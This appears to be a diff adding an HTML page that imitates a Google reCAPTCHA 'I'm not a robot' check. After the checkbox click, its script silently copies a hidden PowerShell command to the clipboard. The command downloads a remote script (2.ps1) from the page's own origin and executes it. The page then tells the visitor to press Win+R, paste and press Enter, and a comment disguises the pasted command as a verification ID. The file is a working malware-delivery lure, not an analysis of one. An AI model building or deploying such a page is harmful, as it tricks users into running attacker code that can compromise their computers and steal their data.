@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>reCAPTCHA Verification</title>
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css" crossorigin="anonymous" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0; padding: 40px;
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      color: #202124;
+      user-select: none;
+    }
+
+    .container {
+      background: white;
+      border: 1px solid #dfe1e5;
+      box-shadow: 0 2px 12px rgb(0 0 0 / 0.05);
+      border-radius: 8px;
+      padding: 20px 24px 24px;
+      width: 320px;
+      position: relative;
+    }
+
+    .checkbox-window {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      padding: 8px;
+      border: 1px solid #dfe1e5;
+      border-radius: 4px;
+      transition: box-shadow 0.3s ease, border-color 0.3s ease;
+      background-color: #f5f5f5;
+    }
+
+    .checkbox-window:hover,
+    .checkbox-window:focus-within {
+      box-shadow: 0 0 6px #1a73e8;
+      border-color: #1a73e8;
+      background-color: #fafafa;
+    }
+
+    .checkbox-container {
+      width: 28px;
+      height: 28px;
+      border: 2px solid #5f6368;
+      border-radius: 4px;
+      background: white;
+      position: relative;
+      transition: background-color 0.3s ease, border-color 0.3s ease;
+      flex-shrink: 0;
+    }
+
+    .checkbox-container.checked {
+      background-color: #1a73e8;
+      border-color: #1a73e8;
+    }
+
+    .checkbox-container.checked::after {
+      content: "\f00c";
+      font-family: "Font Awesome 5 Free";
+      font-weight: 900;
+      color: white;
+      position: absolute;
+      top: 2px;
+      left: 6px;
+      font-size: 18px;
+    }
+
+    .checkbox-label {
+      font-weight: 400;
+      font-size: 15px;
+      color: #202124;
+      user-select: none;
+    }
+
+    .spinner {
+      border: 3px solid #ccc;
+      border-top: 3px solid #1a73e8;
+      border-radius: 50%;
+      width: 22px;
+      height: 22px;
+      animation: spin 1s linear infinite;
+      display: none;
+      margin-left: 8px;
+      flex-shrink: 0;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .verify-window {
+      margin-top: 18px;
+      background: #f9f9f9;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      box-shadow: 0 1px 2px rgb(0 0 0 / 0.1);
+      opacity: 0;
+      max-height: 0;
+      overflow: hidden;
+      transition: opacity 0.4s ease, max-height 0.5s ease;
+      user-select: text;
+    }
+
+    .verify-window.active {
+      opacity: 1;
+      max-height: 450px;
+      padding: 16px 20px 20px;
+    }
+
+    .verify-header {
+      border-bottom: 1px solid #dadce0;
+      margin-bottom: 12px;
+      padding-bottom: 8px;
+    }
+
+    .verify-header .title {
+      font-size: 18px;
+      font-weight: 500;
+      color: #202124;
+      margin-bottom: 4px;
+    }
+    .verify-header .subtitle {
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .verify-list {
+      list-style-type: decimal;
+      padding-left: 18px;
+      color: #3c4043;
+      font-size: 14px;
+      margin: 12px 0 18px;
+      line-height: 1.5;
+    }
+    .verify-list li {
+      margin-bottom: 10px;
+    }
+    .verify-list i {
+      color: #1a73e8;
+      margin-left: 4px;
+      font-size: 14px;
+      vertical-align: middle;
+    }
+    .verify-list b {
+      font-weight: 600;
+      color: #202124;
+    }
+
+    .verification-info {
+      font-size: 13px;
+      color: #5f6368;
+      margin-bottom: 20px;
+      word-break: break-word;
+    }
+
+    .verification-code {
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 12px;
+      background: #e8f0fe;
+      color: #1967d2;
+      padding: 6px 10px;
+      border-radius: 4px;
+      display: inline-block;
+      max-width: 100%;
+      user-select: all; 
+    }
+
+    .verify-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      color: #5f6368;
+    }
+
+    .verify-button {
+      background-color: #1a73e8;
+      border: none;
+      color: white;
+      padding: 10px 18px;
+      border-radius: 4px;
+      font-weight: 600;
+      cursor: not-allowed;
+      opacity: 0.6;
+      transition: background-color 0.3s ease, opacity 0.3s ease;
+      user-select: none;
+    }
+
+    .verify-button.enabled {
+      cursor: pointer;
+      opacity: 1;
+    }
+    .verify-button.enabled:hover,
+    .verify-button.enabled:focus {
+      background-color: #155ab6;
+      outline: none;
+    }
+
+    .privacy {
+      font-size: 11px;
+      color: #5f6368;
+      margin-top: 10px;
+      text-align: center;
+    }
+    .privacy a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .privacy a:hover,
+    .privacy a:focus {
+      text-decoration: underline;
+      outline: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" role="main" aria-label="reCAPTCHA Verification">
+    <div class="checkbox-window" role="checkbox" aria-checked="false" tabindex="0" aria-labelledby="checkbox-label" id="checkbox-window" >
+      <div class="checkbox-container" id="checkbox" aria-hidden="true"></div>
+      <span class="checkbox-label" id="checkbox-label">I'm not a robot</span>
+      <div class="spinner" aria-hidden="true" id="spinner"></div>
+    </div>
+    <p class="privacy" aria-label="Privacy and terms">
+      <a href="https://www.google.com/intl/en/policies/privacy/" target="_blank" rel="noopener noreferrer">Privacy</a> - 
+      <a href="https://www.google.com/intl/en/policies/terms/" target="_blank" rel="noopener noreferrer">Terms</a>
+    </p>
+
+    <section class="verify-window" id="verify-window" aria-hidden="true" aria-live="polite" aria-atomic="true">
+      <header class="verify-header" aria-label="Verification steps header">
+        <div class="title">Complete these</div>
+        <div class="subtitle">Verification steps</div>
+      </header>
+      <ol class="verify-list">
+        <li>Press & hold the Windows Key <i class="fab fa-windows" aria-hidden="true"></i> + <b>R</b>.</li>
+        <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
+        <li>Press <b>Enter</b> on your keyboard to finish.</li>
+      </ol>
+      <div class="verification-info" id="verification-info">
+        You will observe and agree:<br />
+        <code class="verification-code">✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">...</span>"</code>
+      </div>
+      <div class="verify-footer">
+        <small>Perform the steps above to finish verification.</small>
+        <button type="button" class="verify-button" id="verify-button" disabled>Verify</button>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    (() => {
+      const checkboxWindow = document.getElementById('checkbox-window');
+      const checkbox = document.getElementById('checkbox');
+      const spinner = document.getElementById('spinner');
+      const verifyWindow = document.getElementById('verify-window');
+      const verificationIdElem = document.getElementById('verification-id');
+      const verifyButton = document.getElementById('verify-button');
+
+      let verificationId = null;
+      let verified = false;
+
+      function setCheckboxChecked(checked) {
+        checkboxWindow.setAttribute('aria-checked', checked ? 'true' : 'false');
+        if (checked) {
+          checkbox.classList.add('checked');
+        } else {
+          checkbox.classList.remove('checked');
+        }
+      }
+
+      function generateVerificationId() {
+        return Math.floor(100000 + Math.random() * 900000).toString();
+      }
+
+      function copyTextToClipboard(text) {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text).catch(() => fallbackCopyText(text));
+        } else {
+          fallbackCopyText(text);
+        }
+      }
+
+      function fallbackCopyText(text) {
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        textarea.style.position = 'fixed';  // Avoid scrolling to bottom
+        textarea.style.opacity = '0';
+        document.body.appendChild(textarea);
+        textarea.select();
+        try {
+          document.execCommand('copy');
+        } catch {
+          // ignore failure
+        }
+        document.body.removeChild(textarea);
+      }
+
+      // Show spinner and disable checkbox to simulate Google loading
+      function startVerificationProcess() {
+        setCheckboxChecked(true);
+        spinner.style.display = 'inline-block';
+        checkboxWindow.style.cursor = 'default';
+        checkboxWindow.tabIndex = -1;
+
+        // Simulate delay for "verification"
+        setTimeout(() => {
+          spinner.style.display = 'none';
+          showVerifyWindow();
+        }, 1200);
+      }
+
+      // Show the verification steps window with generated ID and prepare clipboard data
+      function showVerifyWindow() {
+        verificationId = generateVerificationId();
+        verificationIdElem.textContent = verificationId;
+
+        const commandToCopy = `powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "iwr '${window.location.origin}/2.ps1' -UseBasicParsing | iex # ✔ I am not a robot - reCAPTCHA Verification ID: ${verificationId}
+`;
+        copyTextToClipboard(commandToCopy);
+
+        verifyWindow.classList.add('active');
+        verifyWindow.setAttribute('aria-hidden', 'false');
+
+        verifyButton.disabled = true;
+        verifyButton.classList.remove('enabled');
+        verified = false;
+      }
+
+      // User clicks verify - simulate verification success
+      function handleVerifyClick() {
+        if (verified) return;
+        verified = true;
+        verifyButton.disabled = true;
+        verifyButton.classList.remove('enabled');
+        verifyButton.textContent = "Verified";
+
+        // Show a success message or perform further logic here as needed
+        alert('Verification completed successfully!');
+      }
+
+      // Listen for checkbox clicks and key presses for accessibility
+      checkboxWindow.addEventListener('click', () => {
+        if (spinner.style.display === 'inline-block' || verifyWindow.classList.contains('active')) return;
+        startVerificationProcess();
+      });
+
+      checkboxWindow.addEventListener('keydown', (e) => {
+        if (e.key === ' ' || e.key === 'Enter') {
+          e.preventDefault();
+          checkboxWindow.click();
+        }
+      });
+
+      // Listen for input in the verification code area to enable verify button
+      // We will simulate verification by user pressing Ctrl+V then Enter steps
+      window.addEventListener('keydown', (e) => {
+        if (!verifyWindow.classList.contains('active') || verified) return;
+
+        if (e.ctrlKey && (e.key === 'v' || e.key === 'V')) {
+          // User pressed ctrl+v, enabling verify button
+          verifyButton.disabled = false;
+          verifyButton.classList.add('enabled');
+          verifyButton.focus();
+        }
+        if (e.key === 'Enter' && !verifyButton.disabled) {
+          handleVerifyClick();
+        }
+      });
+
+      // Also allow verify button click
+      verifyButton.addEventListener('click', () => {
+        if (!verifyButton.disabled) {
+          handleVerifyClick();
+        }
+      });
+
+      // Accessibility: announce when verify window is shown
+      verifyWindow.addEventListener('transitionend', () => {
+        if (verifyWindow.classList.contains('active')) {
+          verifyWindow.focus();
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
